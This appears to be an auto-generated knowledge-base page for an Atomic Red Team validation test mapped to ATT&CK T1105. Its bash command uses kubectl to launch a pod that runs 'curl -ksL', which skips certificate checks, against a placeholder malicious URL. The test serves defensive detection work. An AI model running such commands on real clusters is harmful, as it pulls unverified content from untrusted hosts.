---
atomic_guid: "7e2ad0db-1efa-4af2-a77c-bc6e87d7b3f3"
title: "Curl Insecure Connection from a Pod"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-27 19:12:27"
executor: "bash"
aliases:
  - "7e2ad0db-1efa-4af2-a77c-bc6e87d7b3f3"
  - "Curl Insecure Connection from a Pod"
platforms:
  - "containers"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Launches an Ubuntu pod, installs curl, and executes curl with insecure flags (-k/--insecure)
against a target URL. The pod is automatically deleted after execution.

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Input Arguments

### image_name

- description: Name of the docker image
- type: string
- default: curlimages/curl

### pod_name

- description: K8s pod_name to execute the command in
- type: string
- default: atomic-insecure-curl

### remote_url

- description: Remote URL to curl
- type: string
- default: https://malicious-apt.com

## Dependencies

kubectl must be installed and configured

### Prerequisite Check

```untitled
which kubectl
```

### Get Prerequisite

```untitled
echo "kubectl must be installed manually"
```

## Executor

- elevation_required: False
- name: bash

### Command

```bash
kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- curl -ksL #{remote_url}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
